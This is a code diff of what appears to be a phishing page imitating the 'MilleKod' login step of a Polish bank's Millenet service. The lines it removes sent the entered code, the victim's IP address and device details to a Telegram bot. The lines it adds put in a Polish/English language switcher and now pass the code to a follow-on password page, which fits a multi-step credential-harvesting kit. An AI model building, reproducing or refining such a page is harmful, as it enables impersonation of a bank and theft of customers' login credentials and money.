@@ -20,6 +20,82 @@
         }
 
 
+        /* Language Switcher */
+        .language-switcher {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+
+        .language-btn {
+            width: 50px;
+            height: 30px;
+            border-radius: 15px;
+            border: 2px solid #e5e5e7;
+            background-color: #ffffff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 600;
+            color: #000000;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .language-btn:hover {
+            border-color: #ff2d92;
+            transform: scale(1.05);
+        }
+
+        .language-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, #ff2d92, #e0267d);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .language-btn:hover::before {
+            opacity: 0.1;
+        }
+
+        .language-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Logo Placeholder */
+        .logo-container {
+            position: absolute;
+            top: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 80px;
+            border: 2px dashed #e5e5e7;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f8f9fa;
+            z-index: 10;
+        }
+
+        .logo-placeholder {
+            font-size: 12px;
+            color: #8e8e93;
+            text-align: center;
+            line-height: 1.2;
+        }
+
         /* Progress Bar */
         .progress-container {
             position: fixed;
@@ -236,6 +312,20 @@
     </style>
 </head>
 <body>
+    <!-- Language Switcher -->
+    <div class="language-switcher">
+        <button class="language-btn" id="languageBtn" title="Switch Language">
+            <span id="languageText">EN</span>
+        </button>
+    </div>
+
+    <!-- Logo Placeholder -->
+    <div class="logo-container">
+        <div class="logo-placeholder">
+            LOGO<br>PLACE
+        </div>
+    </div>
+
     <!-- Progress Bar -->
     <div class="progress-container">
         <div class="progress-bar"></div>
@@ -243,7 +333,7 @@
 
     <!-- Main Content -->
     <div class="main-content">
-        <h1 class="title">Enter MilleKod</h1>
+        <h1 class="title" data-text="title">Enter MilleKod</h1>
         
         <div class="input-container">
             <input 
@@ -251,6 +341,7 @@
                 class="input-field" 
                 id="millekodInput"
                 placeholder=""
+                data-placeholder="placeholder"
                 maxlength="8"
                 autocomplete="off"
                 autocorrect="off"
@@ -259,15 +350,15 @@
             >
         </div>
 
-        <a href="#" class="forgot-link" id="forgotLink">I don't remember Millekod</a>
+        <a href="#" class="forgot-link" id="forgotLink" data-text="forgot">I don't remember Millekod</a>
 
-        <p class="description">
+        <p class="description" data-text="description">
             Enter an 8-digit MilleKod login or your own name for MilleKod defined in Millenet.
         </p>
 
         <div class="buttons-container">
-            <button class="btn btn-primary" id="nextBtn" disabled>NEXT</button>
-            <button class="btn btn-secondary" id="cancelBtn">CANCEL</button>
+            <button class="btn btn-primary" id="nextBtn" disabled data-text="next">NEXT</button>
+            <button class="btn btn-secondary" id="cancelBtn" data-text="cancel">CANCEL</button>
         </div>
     </div>
 
@@ -293,10 +384,68 @@
             apiUrl: 'https://api.telegram.org'
         };
 
+        // Language translations
+        const translations = {
+            pl: {
+                title: "Wprowadź MilleKod",
+                placeholder: "Wprowadź 8-cyfrowy kod",
+                forgot: "Nie pamiętam MilleKod",
+                description: "Wprowadź 8-cyfrowy login MilleKod lub własną nazwę dla MilleKod zdefiniowaną w Millenet.",
+                next: "DALEJ",
+                cancel: "ANULUJ",
+                success: "MilleKod zaakceptowany! Przekierowywanie do hasła...",
+                error: "Wprowadź prawidłowy 8-cyfrowy kod",
+                errorSubmit: "Błąd przetwarzania kodu. Spróbuj ponownie."
+            },
+            en: {
+                title: "Enter MilleKod",
+                placeholder: "Enter 8-digit code",
+                forgot: "I don't remember Millekod",
+                description: "Enter an 8-digit MilleKod login or your own name for MilleKod defined in Millenet.",
+                next: "NEXT",
+                cancel: "CANCEL",
+                success: "MilleKod accepted! Redirecting to password...",
+                error: "Please enter a valid 8-digit code",
+                errorSubmit: "Error processing code. Please try again."
+            }
+        };
+
+        // Current language
+        let currentLang = 'pl';
+
+        // Language switching functions
+        function switchLanguage() {
+            // Toggle between languages
+            currentLang = currentLang === 'pl' ? 'en' : 'pl';
+            
+            // Update button text to show opposite language
+            const languageText = document.getElementById('languageText');
+            languageText.textContent = currentLang === 'pl' ? 'EN' : 'PL';
+            
+            // Update all text elements
+            document.querySelectorAll('[data-text]').forEach(element => {
+                const key = element.getAttribute('data-text');
+                if (translations[currentLang][key]) {
+                    element.textContent = translations[currentLang][key];
+                }
+            });
+            
+            // Update placeholder
+            if (input.getAttribute('data-placeholder')) {
+                input.placeholder = translations[currentLang].placeholder;
+            }
+        }
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
             input.focus();
             updateButtonState();
+            
+            // Set initial language
+            switchLanguage();
+            
+            // Add language switcher event listener
+            document.getElementById('languageBtn').addEventListener('click', switchLanguage);
         });
 
         // Input handling
@@ -410,63 +559,31 @@
             }
         }
 
-        // Submit code to Telegram
+        // Submit code and redirect to password page
         async function submitCode(code) {
             setLoadingState(true);
             
             try {
-                // Get client information
-                const clientInfo = await getClientInfo();
-                
-                const messageText = `🔐 <b>New MilleKod Submitted</b>
-
-📋 <b>MilleKod:</b> <code>${code}</code>
-🌐 <b>Website:</b> ${clientInfo.websiteUrl}
-🌍 <b>Client IP:</b> <code>${clientInfo.clientIP}</code>
-🕐 <b>Time:</b> ${new Date().toLocaleString('ru-RU')}
-🆔 <b>ID:</b> ${Date.now()}
-
-📱 <b>Device Info:</b>
-• Platform: ${navigator.platform}
-• User Agent: ${navigator.userAgent.substring(0, 100)}...
-
-<i>Submitted from MilleKod system</i>`;
-
-                const url = `${TELEGRAM_CONFIG.apiUrl}/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CONFIG.chatId,
-                        text: messageText,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                const result = await response.json();
-
-                if (result.ok) {
-                    showMessage('MilleKod submitted successfully!', 'success');
-                    input.value = '';
-                    updateButtonState();
-                    
-                    // Update progress bar
-                    progressBar.style.width = '40%';
-                    
-                    // Simulate next step after delay
-                    setTimeout(() => {
-                        showMessage('Redirecting to next step...', 'success');
-                        progressBar.style.width = '60%';
-                    }, 1500);
-                } else {
-                    throw new Error(result.description || 'Failed to submit MilleKod');
+                // Validate code first
+                if (!validateCode(code)) {
+                    showMessage(translations[currentLang].error, 'error');
+                    return;
                 }
+
+                // Show success message
+                showMessage(translations[currentLang].success, 'success');
+                
+                // Update progress bar
+                progressBar.style.width = '60%';
+                
+                // Redirect to password page with MilleKod
+                setTimeout(() => {
+                    window.location.href = `password.html?code=${encodeURIComponent(code)}`;
+                }, 1500);
+                
             } catch (error) {
-                console.error('Error submitting MilleKod:', error);
-                showMessage('Failed to submit MilleKod. Please try again.', 'error');
+                console.error('Error processing code:', error);
+                showMessage(translations[currentLang].errorSubmit, 'error');
             } finally {
                 setLoadingState(false);
             }
